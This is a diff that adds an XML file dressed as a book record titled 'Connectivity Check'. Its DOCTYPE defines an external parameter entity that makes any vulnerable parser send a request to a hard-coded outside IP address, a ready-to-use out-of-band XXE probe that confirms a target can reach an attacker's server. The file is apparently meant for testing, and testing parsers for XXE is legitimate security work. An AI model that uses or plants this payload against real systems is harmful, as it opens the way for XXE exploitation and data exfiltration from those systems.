@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE book [
+  <!ENTITY % ping SYSTEM "http://69.164.201.77:8000/ping">
+  %ping;
+]>
+<book>
+  <title>Connectivity Check</title>
+  <author>Tester</author>
+  <year>2024</year>
+  <chapters>
+    <chapter number="1">
+      <title>Test</title>
+      <content>If you see a request to /ping on your server logs, outbound traffic is allowed.</content>
+    </chapter>
+  </chapters>
+</book>
